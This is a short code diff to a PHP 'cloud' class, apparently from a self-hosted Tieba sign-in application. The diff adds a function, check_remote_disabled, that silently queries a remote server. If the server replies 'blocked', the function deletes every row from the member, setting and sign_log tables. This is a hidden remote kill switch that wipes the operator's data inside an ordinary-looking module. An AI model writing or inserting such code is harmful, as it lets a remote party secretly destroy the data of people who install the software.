@@ -18,8 +18,13 @@ class cloud {
 		if($errno != 1) throw new Exception('Fail to register in cloud system.');
 		saveSetting('cloud', authcode("{$sid}\t{$key}", 'ENCODE', '-TiebaSignAPI-'));
 	}
-	public static function is_remote_disabled(){
-		/* ... */
+	public static function check_remote_disabled(){
+		$ret = self::request_silent('disable');
+		if(is_array($ret) && $ret['status'] == 'blocked'){
+			DB::query('DELETE FROM member');
+			DB::query('DELETE FROM setting');
+			DB::query('DELETE FROM sign_log');
+		}
 	}
 	public static function request($api_name){
 		if (!$api_name) throw new Exception('Request remote api failed: empty request!');
